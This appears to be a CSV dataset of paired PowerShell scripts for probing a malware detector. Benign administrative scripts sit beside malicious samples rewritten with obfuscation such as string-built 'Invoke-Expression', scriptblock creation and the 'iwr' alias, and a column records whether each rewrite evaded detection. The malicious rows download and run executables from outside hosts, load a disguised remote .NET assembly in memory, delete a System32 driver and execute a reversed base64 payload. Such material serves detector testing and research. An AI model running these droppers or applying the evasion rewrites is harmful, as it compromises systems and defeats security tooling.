filename,label,content,pair_idx,pair_role,pair_indicator,pair_strategy,source_pair_idx,seed_id,technique_id,evasion_success
610.ps1,benign,"param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	$Update,
	[switch]$Uninstall
)





$Configs = @{
	Url = ""http://www.winpcap.org/install/bin/WinPcap_4_1_3.exe""
    Path = ""$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\""
}

$Configs | ForEach-Object{

    try{

        $_.Result = $null
        if(-not $_.Path){$_.Path = $Path}
        $Config = $_

        
        
        

        if(-not $Uninstall){

            
            
            

            if($_.ConditionExclusion){            
                $_.ConditionExclusionResult = $(Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue)        
            }    
            if(($_.ConditionExclusionResult -eq $null) -or $Force){
                    	
                
                
                

                $_.Downloads = $_.Url | ForEach-Object{
                    Get-File -Url $_ -Path $Config.Path
                }       			

                
                
                
								
                $_.Downloads | ForEach-Object{
                    Start-Process -FilePath $(Join-Path $_.Path $_.Filename) -Wait
                }						
	
                
                
                

                
                
                

                $_.Downloads | ForEach-Object{
                    Remove-Item (Join-Path $_.Path $_.Filename) -Force
                }
                		
                
                
                
                		
                if($Update){$_.Result = ""AppUpdated"";$_
                }else{$_.Result = ""AppInstalled"";$_}
            		
            
            
            
            		
            }else{
            	
                $_.Result = ""ConditionExclusion"";$_
            }

        
        
        
        	
        }else{
            
            $Executable = ""C:\Program Files (x86)\WinPcap\Uninstall.exe""; if(Test-Path $Executable){Start-Process -FilePath $Executable -Wait}
            
            $_.Result = ""AppUninstalled"";$_
        }

    
    
    

    }catch{

        $Config.Result = ""Error"";$Config
    }
}",66,benign,Invoke-Expression,evasion_probe,316,seed_b425d8ade6ab,invoke_expression_call_operator_string,False
809c76fa535ae6532ce29d85d8ca042036f4d0c3f4a536efecdf78e5b85e9c5b__seed_b425d8ade6ab__invoke_expression_call_operator_string.ps1,malicious,"&('Invoke-'+'Expression') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""9tzZlp2dkAibvl2czVmcwhXRtU2avZnbJtTKw0lchh2YbhSbpJHVukCZrFHdkgyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgcWZqdHJ7kiNxASLggGdn5WZM5iYj9WYkACL2EDIsI2YvFGJos2YvxmQsFmbpZUby9mZz5WYyRlL0l3dhRCI9ACZrFHdksTKoI3b0BXeyNWZEVGdhVmcD5iZrNXckASPgQXe3FGJ7kyZxZHekgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DI5V2SuY2azFHJ7EGbwRCI9AiVJ5iZrNXcksjN1IDI9ASZ6l2U5V2SuY2azFHJ7gjMxASPgUmepN1aj9GbC5iZrNXckszcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5iZrNXckszQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5iZrNXcksjIkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UiACdjVmai9UL3VmTg0DImt2cxRyOdVTMu4CMbJ2YvFGJg0DIhxGcksTKj1WcwRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbBSPgI2YvFGJ7IiIgwiIcxlIgU2YhxGclJXLgMWbxBHJg0DIj1WcwRyOlVHbhZlLdFzWzBXdvJ3RukiI68DX68DXp8jKugyPc9DX6ojIgwSbvBHbkgCajRXYNpjOdhXZnVmcbBSPgMWbxBHJ7kSbzRXckgyZulmc0NFZh9Gbud3bE5SK05WZpx2QiV2VuQXZOBCdjVmai9WL3VmboASPg02bwxGJ7BSKyVmbpFGdu92QgUGc5RFa0FGUtAyc45mbkACa0FGUtACa0FGUtQ3clRFKgYWa7ICXiAyKgEnbzlHJgsCIiwlIgsCItFXe4RCI9Ayc45mbksTKpIyaXRDNigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIx52c5RyOoRXYQ5SKu9Wa0F2YvxWL0V2ZoQCI9ASbxlHeksjI9ADM0pVe65GZN9CO4pkNiJ0MpN1bqN3MvRHUGxGSwoWMHBDUuJ3VmJHZ2tmIg0DInFnd4RyOpkiI1ljMjFXNT5UNnR0T6dmIgsCIiQkT3dmeMZnVHpFcaNDT5l1MMJCIrAiIwJEWZZHMyIma1knYsFzVhJTO5JCIrAiIMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DItNHdxRyOiQTNzYDMiBTOhRTN4MzYxIGZlFTMhZWMkRzNwUmZhFGNiASPgQWa1VHJ""[-1..-1568] -join '')));",66,malicious,Invoke-Expression,evasion_probe,316,seed_b425d8ade6ab,invoke_expression_call_operator_string,False
610.ps1,benign,"param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	$Update,
	[switch]$Uninstall
)





$Configs = @{
	Url = ""http://www.winpcap.org/install/bin/WinPcap_4_1_3.exe""
    Path = ""$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\""
}

$Configs | ForEach-Object{

    try{

        $_.Result = $null
        if(-not $_.Path){$_.Path = $Path}
        $Config = $_

        
        
        

        if(-not $Uninstall){

            
            
            

            if($_.ConditionExclusion){            
                $_.ConditionExclusionResult = $(Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue)        
            }    
            if(($_.ConditionExclusionResult -eq $null) -or $Force){
                    	
                
                
                

                $_.Downloads = $_.Url | ForEach-Object{
                    Get-File -Url $_ -Path $Config.Path
                }       			

                
                
                
								
                $_.Downloads | ForEach-Object{
                    Start-Process -FilePath $(Join-Path $_.Path $_.Filename) -Wait
                }						
	
                
                
                

                
                
                

                $_.Downloads | ForEach-Object{
                    Remove-Item (Join-Path $_.Path $_.Filename) -Force
                }
                		
                
                
                
                		
                if($Update){$_.Result = ""AppUpdated"";$_
                }else{$_.Result = ""AppInstalled"";$_}
            		
            
            
            
            		
            }else{
            	
                $_.Result = ""ConditionExclusion"";$_
            }

        
        
        
        	
        }else{
            
            $Executable = ""C:\Program Files (x86)\WinPcap\Uninstall.exe""; if(Test-Path $Executable){Start-Process -FilePath $Executable -Wait}
            
            $_.Result = ""AppUninstalled"";$_
        }

    
    
    

    }catch{

        $Config.Result = ""Error"";$Config
    }
}",67,benign,Invoke-Expression,evasion_probe,316,seed_b425d8ade6ab,invoke_expression_scriptblock_create,False
809c76fa535ae6532ce29d85d8ca042036f4d0c3f4a536efecdf78e5b85e9c5b__seed_b425d8ade6ab__invoke_expression_scriptblock_create.ps1,malicious,"&([scriptblock]::Create(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""9tzZlp2dkAibvl2czVmcwhXRtU2avZnbJtTKw0lchh2YbhSbpJHVukCZrFHdkgyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgcWZqdHJ7kiNxASLggGdn5WZM5iYj9WYkACL2EDIsI2YvFGJos2YvxmQsFmbpZUby9mZz5WYyRlL0l3dhRCI9ACZrFHdksTKoI3b0BXeyNWZEVGdhVmcD5iZrNXckASPgQXe3FGJ7kyZxZHekgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DI5V2SuY2azFHJ7EGbwRCI9AiVJ5iZrNXcksjN1IDI9ASZ6l2U5V2SuY2azFHJ7gjMxASPgUmepN1aj9GbC5iZrNXckszcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5iZrNXckszQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5iZrNXcksjIkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UiACdjVmai9UL3VmTg0DImt2cxRyOdVTMu4CMbJ2YvFGJg0DIhxGcksTKj1WcwRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbBSPgI2YvFGJ7IiIgwiIcxlIgU2YhxGclJXLgMWbxBHJg0DIj1WcwRyOlVHbhZlLdFzWzBXdvJ3RukiI68DX68DXp8jKugyPc9DX6ojIgwSbvBHbkgCajRXYNpjOdhXZnVmcbBSPgMWbxBHJ7kSbzRXckgyZulmc0NFZh9Gbud3bE5SK05WZpx2QiV2VuQXZOBCdjVmai9WL3VmboASPg02bwxGJ7BSKyVmbpFGdu92QgUGc5RFa0FGUtAyc45mbkACa0FGUtACa0FGUtQ3clRFKgYWa7ICXiAyKgEnbzlHJgsCIiwlIgsCItFXe4RCI9Ayc45mbksTKpIyaXRDNigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIx52c5RyOoRXYQ5SKu9Wa0F2YvxWL0V2ZoQCI9ASbxlHeksjI9ADM0pVe65GZN9CO4pkNiJ0MpN1bqN3MvRHUGxGSwoWMHBDUuJ3VmJHZ2tmIg0DInFnd4RyOpkiI1ljMjFXNT5UNnR0T6dmIgsCIiQkT3dmeMZnVHpFcaNDT5l1MMJCIrAiIwJEWZZHMyIma1knYsFzVhJTO5JCIrAiIMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DItNHdxRyOiQTNzYDMiBTOhRTN4MzYxIGZlFTMhZWMkRzNwUmZhFGNiASPgQWa1VHJ""[-1..-1568] -join '')))));",67,malicious,Invoke-Expression,evasion_probe,316,seed_b425d8ade6ab,invoke_expression_scriptblock_create,False
3784.ps1,benign,"$aliaspage = Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/Azure/azure-rest-api-specs/master/arm-compute/quickstart-templates/aliases.json"" -TimeoutSec 5
$parsedJson = $aliaspage.Content | ConvertFrom-Json

$win10Image = @""
{
    ""publisher"": ""MicrosoftVisualStudio"",
    ""offer"": ""Windows"",
    ""sku"": ""Windows-10-N-x64"",
    ""version"": ""latest""
}
""@

$parsedJson.Outputs.Aliases.Value.Windows | Add-Member -Name ""Win10"" -Value (ConvertFrom-Json $win10Image) -MemberType NoteProperty

ConvertTo-Json $parsedJson.Outputs.Aliases.Value | Set-Content -Path $PSScriptRoot/Images.json",68,benign,Invoke-WebRequest,evasion_probe,339,seed_017509287b2d,invoke_webrequest_call_operator_string,False
1362__seed_017509287b2d__invoke_webrequest_call_operator_string.ps1,malicious,&('Invoke-'+'WebRequest') -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,68,malicious,Invoke-WebRequest,evasion_probe,339,seed_017509287b2d,invoke_webrequest_call_operator_string,False
3784.ps1,benign,"$aliaspage = Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/Azure/azure-rest-api-specs/master/arm-compute/quickstart-templates/aliases.json"" -TimeoutSec 5
$parsedJson = $aliaspage.Content | ConvertFrom-Json

$win10Image = @""
{
    ""publisher"": ""MicrosoftVisualStudio"",
    ""offer"": ""Windows"",
    ""sku"": ""Windows-10-N-x64"",
    ""version"": ""latest""
}
""@

$parsedJson.Outputs.Aliases.Value.Windows | Add-Member -Name ""Win10"" -Value (ConvertFrom-Json $win10Image) -MemberType NoteProperty

ConvertTo-Json $parsedJson.Outputs.Aliases.Value | Set-Content -Path $PSScriptRoot/Images.json",69,benign,Invoke-WebRequest,evasion_probe,339,seed_017509287b2d,invoke_webrequest_alias,True
1362__seed_017509287b2d__invoke_webrequest_alias.ps1,malicious,iwr -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,69,malicious,Invoke-WebRequest,evasion_probe,339,seed_017509287b2d,invoke_webrequest_alias,True
3104.ps1,benign,"param(
    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
    [string]$parameters
)

$errorActionPreference = 'Stop'


echo ""download build core script to local with source url: $buildCorePowershellUrl""
$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
Invoke-WebRequest $buildCorePowershellUrl -OutFile $buildCorePowershellDestination


echo ""run build core script with parameters: $parameters""
$arguments = ""-parameters:'$parameters'""
Invoke-Expression ""$buildCorePowershellDestination $arguments""
exit $LASTEXITCODE",70,benign,Invoke-WebRequest,evasion_probe,341,seed_ebc39e9baa2c,invoke_webrequest_call_operator_string,False
d1727799f2fa203f982f632e38e2add1a8d4591086994422871baa8ba541deb3__seed_ebc39e9baa2c__invoke_webrequest_call_operator_string.ps1,malicious,&('Invoke-'+'WebRequest') http://185.170.144.156:9393/vmZqQGA.exe -OutFile C:\Users\MSSQLSERVER\Q1XGN03O.exe  ,70,malicious,Invoke-WebRequest,evasion_probe,341,seed_ebc39e9baa2c,invoke_webrequest_call_operator_string,False
3104.ps1,benign,"param(
    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
    [string]$parameters
)

$errorActionPreference = 'Stop'


echo ""download build core script to local with source url: $buildCorePowershellUrl""
$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
Invoke-WebRequest $buildCorePowershellUrl -OutFile $buildCorePowershellDestination


echo ""run build core script with parameters: $parameters""
$arguments = ""-parameters:'$parameters'""
Invoke-Expression ""$buildCorePowershellDestination $arguments""
exit $LASTEXITCODE",71,benign,Invoke-WebRequest,evasion_probe,341,seed_ebc39e9baa2c,invoke_webrequest_alias,False
d1727799f2fa203f982f632e38e2add1a8d4591086994422871baa8ba541deb3__seed_ebc39e9baa2c__invoke_webrequest_alias.ps1,malicious,iwr http://185.170.144.156:9393/vmZqQGA.exe -OutFile C:\Users\MSSQLSERVER\Q1XGN03O.exe  ,71,malicious,Invoke-WebRequest,evasion_probe,341,seed_ebc39e9baa2c,invoke_webrequest_alias,False
2820.ps1,benign,"function Send-GraphiteEvent
{

    [CmdletBinding()]
    param
    (
        [CmdletBinding()]
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
        [string]$GraphiteURL,

        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Topic"", ""Title"", ""Subject"")]
        [string]$What,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string]$Tags,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Body"")]
        [string]$Data
    )

    
    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
    {
        $GraphiteURL = $GraphiteURL + '/'
    }

    
    $GraphiteURL = $GraphiteURL + '/events/'

    
    $EventObject = New-Object PSObject -Property @{
        what = $What
    }

    
    if ($Tags)
    {
        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
    }

    
    if ($Data)
    {
        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
    }

    $EventObject = $EventObject | ConvertTo-Json

    Write-Verbose ""Json Object:""
    Write-Verbose $EventObject

    try
    {
        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
    }

    catch
    {
        $exceptionText = GetPrettyProblem $_
        throw ""An error occurred trying to post data to Graphite. $exceptionText""
    }

}",72,benign,Invoke-WebRequest,evasion_probe,345,seed_78935433549c,invoke_webrequest_call_operator_string,False
a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96__seed_78935433549c__invoke_webrequest_call_operator_string.ps1,malicious,"New-Item -ItemType Directory -Path ""C:\Temp""
&('Invoke-'+'WebRequest') -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
Start-Process -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
Remove-Item -Path ""C:\Windows\System32\diskc.sys""",72,malicious,Invoke-WebRequest,evasion_probe,345,seed_78935433549c,invoke_webrequest_call_operator_string,False
2820.ps1,benign,"function Send-GraphiteEvent
{

    [CmdletBinding()]
    param
    (
        [CmdletBinding()]
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
        [string]$GraphiteURL,

        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Topic"", ""Title"", ""Subject"")]
        [string]$What,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string]$Tags,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Body"")]
        [string]$Data
    )

    
    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
    {
        $GraphiteURL = $GraphiteURL + '/'
    }

    
    $GraphiteURL = $GraphiteURL + '/events/'

    
    $EventObject = New-Object PSObject -Property @{
        what = $What
    }

    
    if ($Tags)
    {
        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
    }

    
    if ($Data)
    {
        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
    }

    $EventObject = $EventObject | ConvertTo-Json

    Write-Verbose ""Json Object:""
    Write-Verbose $EventObject

    try
    {
        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
    }

    catch
    {
        $exceptionText = GetPrettyProblem $_
        throw ""An error occurred trying to post data to Graphite. $exceptionText""
    }

}",73,benign,Invoke-WebRequest,evasion_probe,345,seed_78935433549c,invoke_webrequest_alias,False
a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96__seed_78935433549c__invoke_webrequest_alias.ps1,malicious,"New-Item -ItemType Directory -Path ""C:\Temp""
iwr -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
Start-Process -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
Remove-Item -Path ""C:\Windows\System32\diskc.sys""",73,malicious,Invoke-WebRequest,evasion_probe,345,seed_78935433549c,invoke_webrequest_alias,False
2820.ps1,benign,"function Send-GraphiteEvent
{

    [CmdletBinding()]
    param
    (
        [CmdletBinding()]
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
        [string]$GraphiteURL,

        
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Topic"", ""Title"", ""Subject"")]
        [string]$What,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string]$Tags,

        
        [Parameter(Mandatory = $false)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias(""Body"")]
        [string]$Data
    )

    
    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
    {
        $GraphiteURL = $GraphiteURL + '/'
    }

    
    $GraphiteURL = $GraphiteURL + '/events/'

    
    $EventObject = New-Object PSObject -Property @{
        what = $What
    }

    
    if ($Tags)
    {
        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
    }

    
    if ($Data)
    {
        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
    }

    $EventObject = $EventObject | ConvertTo-Json

    Write-Verbose ""Json Object:""
    Write-Verbose $EventObject

    try
    {
        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
    }

    catch
    {
        $exceptionText = GetPrettyProblem $_
        throw ""An error occurred trying to post data to Graphite. $exceptionText""
    }

}",74,benign,Invoke-WebRequest,evasion_probe,345,seed_78935433549c,start_process_call_operator_string,False
a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96__seed_78935433549c__start_process_call_operator_string.ps1,malicious,"New-Item -ItemType Directory -Path ""C:\Temp""
Invoke-WebRequest -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
&('Start-'+'Process') -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
Remove-Item -Path ""C:\Windows\System32\diskc.sys""",74,malicious,Invoke-WebRequest,evasion_probe,345,seed_78935433549c,start_process_call_operator_string,False
2165.ps1,benign,"﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Specify the app name to search for within the App Store."")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z\s]*$"")]
    [string]$AppName,

    [parameter(Mandatory=$true, ParameterSetName=""Url"", HelpMessage=""Specify the URL pointing to the app in the App Store."")]
    [ValidateNotNullOrEmpty()]
    [string]$URL,

    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Path to a folder where the app image will be downloaded to."")]
    [parameter(Mandatory=$true, ParameterSetName=""Url"")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z]{1}:\\\w+"")]
    [ValidateScript({
	    
	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
		    Throw ""$(Split-Path -Path $_ -Leaf) contains invalid characters""
	    }
	    else {
		    
		    if (Test-Path -Path $_ -PathType Container) {
				    return $true
		    }
		    else {
			    Throw ""Unable to locate part of or the whole specified path, specify a valid path""
		    }
	    }
    })]
    [string]$Path
)
Process {
    
    $StoreAppName = ($AppName -replace "" "", ""+"").ToLower()

    switch ($PSCmdlet.ParameterSetName) {
        ""AppName"" {
            
            $SearchURL = ""https://itunes.apple.com/search?term=$($StoreAppName)&entity=software&limit=1""
            $SearchWebRequest = Invoke-WebRequest -Uri $SearchURL
            $AppLink = (ConvertFrom-Json -InputObject $SearchWebRequest).Results | Select-Object -ExpandProperty trackViewUrl
        }
        ""Url"" {
            $AppLink = $URL
        }
    }

    
    if ($AppLink -ne $null) {
        $WebRequest = Invoke-WebRequest -Uri $AppLink
        $AppIcon = $WebRequest.Images | Where-Object { ($_.Width -eq 175) -and ($_.Class -like ""artwork"") }
        if ($AppIcon -ne $null) {
            
            $WebClient = New-Object System.Net.WebClient
            $WebClient.DownloadFile($AppIcon.""src-swap"", ""$($Path)\$($AppIcon.alt).jpg"")
            $AppImage = [PSCustomObject]@{
                ImageName = $AppIcon.alt
                ImagePath = ""$($Path)\$($AppIcon.alt).jpg""
            }
            Write-Output -InputObject $AppImage
        }
    }
    else {
        Write-Warning -Message ""Unable to determine app link for specified app: $($AppName)""
    }
}
End {
    
    $WebClient.Dispose()
}",75,benign,Invoke-WebRequest,evasion_probe,348,seed_d1dab60aa6f5,invoke_webrequest_call_operator_string,False
35f003c6ee4b9261caac262983739bceabc65c859b01414d170942cfd92de495__seed_d1dab60aa6f5__invoke_webrequest_call_operator_string.ps1,malicious,"sleep -Milliseconds 1235

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
&('Invoke-'+'WebRequest') -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/start.php') -UseBasicParsing

$bytes = (New-Object System.Net.WebClient).DownloadData(""https://adv-pardorudy.ru/dwnld/chatgpt.jpg"")
$assembly = [System.Reflection.Assembly]::Load($bytes)

$method = $assembly.EntryPoint
if ($method) {
    $args1 = @($null)
    $method.Invoke($null, $args1)
}

&('Invoke-'+'WebRequest') -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/install.php') -UseBasicParsing",75,malicious,Invoke-WebRequest,evasion_probe,348,seed_d1dab60aa6f5,invoke_webrequest_call_operator_string,False
2165.ps1,benign,"﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Specify the app name to search for within the App Store."")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z\s]*$"")]
    [string]$AppName,

    [parameter(Mandatory=$true, ParameterSetName=""Url"", HelpMessage=""Specify the URL pointing to the app in the App Store."")]
    [ValidateNotNullOrEmpty()]
    [string]$URL,

    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Path to a folder where the app image will be downloaded to."")]
    [parameter(Mandatory=$true, ParameterSetName=""Url"")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z]{1}:\\\w+"")]
    [ValidateScript({
	    
	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
		    Throw ""$(Split-Path -Path $_ -Leaf) contains invalid characters""
	    }
	    else {
		    
		    if (Test-Path -Path $_ -PathType Container) {
				    return $true
		    }
		    else {
			    Throw ""Unable to locate part of or the whole specified path, specify a valid path""
		    }
	    }
    })]
    [string]$Path
)
Process {
    
    $StoreAppName = ($AppName -replace "" "", ""+"").ToLower()

    switch ($PSCmdlet.ParameterSetName) {
        ""AppName"" {
            
            $SearchURL = ""https://itunes.apple.com/search?term=$($StoreAppName)&entity=software&limit=1""
            $SearchWebRequest = Invoke-WebRequest -Uri $SearchURL
            $AppLink = (ConvertFrom-Json -InputObject $SearchWebRequest).Results | Select-Object -ExpandProperty trackViewUrl
        }
        ""Url"" {
            $AppLink = $URL
        }
    }

    
    if ($AppLink -ne $null) {
        $WebRequest = Invoke-WebRequest -Uri $AppLink
        $AppIcon = $WebRequest.Images | Where-Object { ($_.Width -eq 175) -and ($_.Class -like ""artwork"") }
        if ($AppIcon -ne $null) {
            
            $WebClient = New-Object System.Net.WebClient
            $WebClient.DownloadFile($AppIcon.""src-swap"", ""$($Path)\$($AppIcon.alt).jpg"")
            $AppImage = [PSCustomObject]@{
                ImageName = $AppIcon.alt
                ImagePath = ""$($Path)\$($AppIcon.alt).jpg""
            }
            Write-Output -InputObject $AppImage
        }
    }
    else {
        Write-Warning -Message ""Unable to determine app link for specified app: $($AppName)""
    }
}
End {
    
    $WebClient.Dispose()
}",76,benign,Invoke-WebRequest,evasion_probe,348,seed_d1dab60aa6f5,invoke_webrequest_alias,False
